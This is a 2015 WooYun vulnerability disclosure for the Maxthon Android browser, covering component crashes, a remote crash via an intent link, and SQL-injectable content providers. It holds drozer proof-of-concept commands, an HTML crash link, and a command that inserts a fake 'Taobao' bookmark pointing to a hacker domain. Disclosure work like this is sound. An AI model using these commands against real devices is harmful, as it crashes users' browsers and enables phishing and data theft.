{"id": 38203, "wybug_id": "wooyun-2015-0120242", "wybug_title": "傲游浏览器Android客户端多个漏洞（信息泄露/远程拒绝服务/SQL注入）", "wybug_corp": "傲游", "wybug_author": "路人甲", "wybug_date": "2015-06-16 15:02", "wybug_open_date": "2015-09-14 18:28", "wybug_type": "拒绝服务", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["手机安全", "客户端安全", "浏览器安全", "远程拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向公众公开  简要描述： 再来 详细说明：  #### 客户端版本，官网下载的最新版Maxthon_4.4.6.2000_remote_ChinaMainland.apk#### 组件拒绝服务客户端以下组件暴露，直接发送intent会导致浏览器崩溃退出\ncom.mx.browser.navigation.reader.RssNewsReaderActivitycom.chukong.cocosplay.GameActivitycom.chukong.cocosplay.GameLandscapeActivitycom.chukong.cocosplay.LoadActivitycom.chukong.cocosplay.LoadFragmentActivitycom.chukong.cocosplay.CocosProxyActivitycom.chukong.cocosplay.CocosProxyFragmentActivitycom.chukong.cocosplay.CocosProxyActivityGroupcom.maxthon.mge.MgePaymentActivitycom.mx.browser.account.AccountReceivercom.mx.browser.cloud.MxReceiver\n\n\n部分Logcat日志：\n\n\n\n\n\nPOC：\ndz> run app.activity.start --component com.mx.browser com.mx.browser.navigation.reader.RssNewsReaderActivitydz> run app.activity.start --component com.mx.browser com.chukong.cocosplay.GameActivitydz> run app.activity.start --component com.mx.browser com.chukong.cocosplay.GameLandscapeActivitydz> run app.activity.start --component com.mx.browser com.chukong.cocosplay.LoadActivitydz> run app.activity.start --component com.mx.browser com.chukong.cocosplay.LoadFragmentActivitydz> run app.activity.start --component com.mx.browser com.chukong.cocosplay.CocosProxyActivitydz> run app.activity.start --component com.mx.browser com.chukong.cocosplay.CocosProxyFragmentActivitydz> run app.activity.start --component com.mx.browser com.chukong.cocosplay.CocosProxyActivityGroupdz> run app.activity.start --component com.mx.browser com.maxthon.mge.MgePaymentActivitydz> run app.broadcast.send --component com.mx.browser com.mx.browser.account.AccountReceiverdz> run app.broadcast.send --component com.mx.browser com.mx.browser.cloud.MxReceiver\nMX浏览器支持IntentScheme，可以实现远程拒绝服务，用户点击含有恶意代码的页面，就会导致浏览器Crash，POC如下\n用一个组件示例，其他类似<h1><a href=\"intent:#Intent;component=com.mx.browser/com.chukong.cocosplay.LoadActivity;end\">com.chukong.cocosplay.LoadActivity</a><br>\n#### 信息泄露&SQL注入数据接口暴露，其他任何APP都可以调用，导致信息泄露\ndz> run app.provider.info -a com.mx.browserPackage: com.mx.browser  Authority: com.mx.browser.browserprovider    Read Permission: null    Write Permission: null    Content Provider: com.mx.browser.BrowserProvider    Multiprocess Allowed: False    Grant Uri Permissions: False  Authority: com.mx.browser.commonprovider    Read Permission: null    Write Permission: null    Content Provider: com.mx.browser.CommonProvider    Multiprocess Allowed: False    Grant Uri Permissions: False\n检测存在SQL注入漏洞\ndz> run scanner.provider.injection -a com.mx.browserScanning com.mx.browser...Not Vulnerable:  content://mx.history/  content://com.tencent.mm.sdk.plugin.provider/sharedpref/  content://icc/adn  content://com.mx.browser.downloadprovider/download/  content://com.mx.browser.downloadprovider/resetdb/  content://com.facebook.katana.provider.AttributionIdProvider/  content://com.android.launcher2.settings/favorites?notify=true/  content://com.mx.browser.commonprovider/  content://com.android.launcher2.settings/favorites?notify=true  content://icc/adn/  content://suggestion.searchengine  content://com.mx.browser.downloadprovider/download  content://com.android.launcher.settings/favorites?notify=true/  content://com.mx.browser.downloadprovider/  content://com.mx.browser.downloadprovider/resetdb  content://com.mx.browser.downloadprovider  content://com.mx.browser.commonprovider  content://com.facebook.katana.provider.AttributionIdProvider  content://com.android.launcher.settings/favorites?notify=true  content://suggestion.searchengine/  content://com.tencent.mm.sdk.plugin.provider/sharedpref  content://mx.historyInjection in Projection:  content://com.mx.browser.browserprovider/  content://com.mx.browser.browserprovider  content://com.mx.browser.browserprovider/bookmark  content://com.mx.browser.browserprovider/bookmark/Injection in Selection:  content://com.mx.browser.browserprovider  content://com.mx.browser.browserprovider/bookmark  content://com.mx.browser.commonprovider/reader/  content://com.mx.browser.commonprovider/reader_item/  content://com.mx.browser.commonprovider/reader_item  content://com.mx.browser.browserprovider/bookmark/  content://com.mx.browser.browserprovider/  content://com.mx.browser.commonprovider/reader\n#### 通过暴露的数据接口，能够篡改用户收藏夹，可用于欺诈钓鱼攻击POC：\ndz> run app.provider.insert content://com.mx.browser.browserprovider/bookmark/ --integer _id 6 --string title Taobao --string url http://www.hacker.com/ --integer parent 0\n执行前：\n\n执行后：\n\n可以看到，插入了一条新的收藏网址，名字是“Taobao”，而对应的网址却是“http://www.hacker.com/”，用户一旦不注意就会中招，造成钱财损失。   漏洞证明：  见详细说明   修复方案：  1. 组件正确处理异常intent2. 敏感的ContentProvider数据接口不要对外暴露，或设置signature级别的权限3. SQL注入问题，过滤、参数化操作等   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2015-06-16 18:26 厂商回复： 多谢作者，我们尽快修复这个问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}